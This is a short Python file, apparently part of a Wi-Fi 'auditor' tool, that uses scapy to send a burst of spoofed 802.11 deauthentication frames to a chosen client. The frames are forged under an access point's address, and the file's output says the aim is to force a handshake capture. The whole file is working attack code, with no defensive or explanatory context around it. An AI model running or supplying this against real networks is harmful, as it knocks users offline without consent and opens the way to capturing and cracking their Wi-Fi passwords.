# === wifi_auditor/deauth_attack.py ===
from scapy.all import *


def deauth_target(interface, target_bssid, client_mac):
    dot11 = Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, iface=interface, count=100, inter=0.1, verbose=0)
    print("[*] Deauthentication packets sent to force handshake.")
